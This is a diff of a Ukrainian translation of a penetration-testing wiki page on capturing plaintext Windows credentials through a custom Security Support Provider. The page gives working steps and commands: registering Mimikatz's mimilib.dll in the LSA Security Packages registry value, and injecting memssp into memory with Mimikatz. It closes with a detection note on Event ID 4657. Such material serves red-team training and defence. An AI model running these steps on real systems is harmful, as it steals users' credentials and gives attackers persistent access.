@@ -4,37 +4,37 @@
 
 ### Custom SSP
 
-[Дізнайтеся, що таке SSP (Security Support Provider) тут.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
-Ви можете створити **свій власний SSP**, щоб **захоплювати** **в чистому вигляді** **облікові дані**, які використовуються для доступу до машини.
+[Дізнайтеся, що таке SSP (Security Support Provider), тут.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
+Ви можете створити **власний SSP**, щоб **перехоплювати** у **відкритому тексті** **облікові дані**, які використовуються для доступу до машини.
 
 #### Mimilib
 
-Ви можете використовувати бінарний файл `mimilib.dll`, наданий Mimikatz. **Це буде записувати в файл всі облікові дані в чистому вигляді.**\
-Скиньте dll у `C:\Windows\System32\`\
-Отримайте список існуючих LSA Security Packages:
+Ви можете використати бінарний файл `mimilib.dll`, наданий Mimikatz. **Цей файл записуватиме всі облікові дані у відкритому тексті у файл.**\
+Помістіть DLL у `C:\Windows\System32\`\
+Отримайте список наявних пакетів безпеки LSA:
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-Додайте `mimilib.dll` до списку постачальників підтримки безпеки (Security Packages):
+Додайте `mimilib.dll` до списку Security Support Provider (Security Packages):
 ```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
-І після перезавантаження всі облікові дані можна знайти у відкритому вигляді в `C:\Windows\System32\kiwissp.log`
+І після перезавантаження всі облікові дані можна знайти у відкритому тексті в `C:\Windows\System32\kiwissp.log`
 
 #### У пам'яті
 
-Ви також можете безпосередньо впровадити це в пам'ять, використовуючи Mimikatz (зверніть увагу, що це може бути трохи нестабільно/не працювати):
+Ви також можете безпосередньо інжектити це в пам'ять за допомогою Mimikatz (зверніть увагу, що це може бути дещо нестабільним/не працювати):
 ```bash
 privilege::debug
 misc::memssp
 ```
-Це не переживе перезавантаження.
+Це не збережеться після перезавантаження.
 
-#### Пом'якшення
+#### Заходи протидії
 
-ID події 4657 - Аудит створення/зміни `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
+Event ID 4657 — аудит створення/зміни `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
 
 {{#include ../../banners/hacktricks-training.md}}
